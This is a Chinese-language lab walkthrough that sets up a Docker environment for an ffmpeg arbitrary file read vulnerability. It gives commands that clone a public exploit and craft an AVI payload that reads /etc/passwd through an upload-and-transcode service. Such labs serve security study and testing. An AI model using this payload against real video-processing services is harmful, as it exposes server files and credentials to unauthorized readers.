# ffmpeg 任意文件读取漏洞环境

## 环境搭建

编译及启动环境

```plain
docker compose build
docker compose up -d
```

环境启动后监听8080端口，访问http://your-ip:8080/即可查看。

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780874710028-7382b7bf-9426-43c4-80d8-d582c0a34dd4.png)

## 漏洞利用

漏洞原理不再赘述，直接下载exp，并生成payload：

```plain
# 下载exp
git clone https://github.com/neex/ffmpeg-avi-m3u-xbin
cd ffmpeg-avi-m3u-xbin

# 生成payload
./gen_xbin_avi.py file:///etc/passwd exp.avi
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780874710129-80dd15f2-de82-4652-b966-7a0bf682f060.png)![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780874710036-a938b26f-b4e6-436f-b1a3-4b6106bd348e.png)

生成exp.avi，在http://your-ip:8080/上传。后端将会将你上传的视频用ffmpeg转码后显示，转码时因为ffmpeg的任意文件读取漏洞，可将文件信息读取到视频中：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780874710063-3a4dbbec-187c-4875-8aee-fffc0d66dd1a.png)

你也可以执行docker compose exec web bash进入本环境内部，测试ffmpeg。

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780874710186-70aec606-7a79-463a-ae1b-c743990eddf4.png)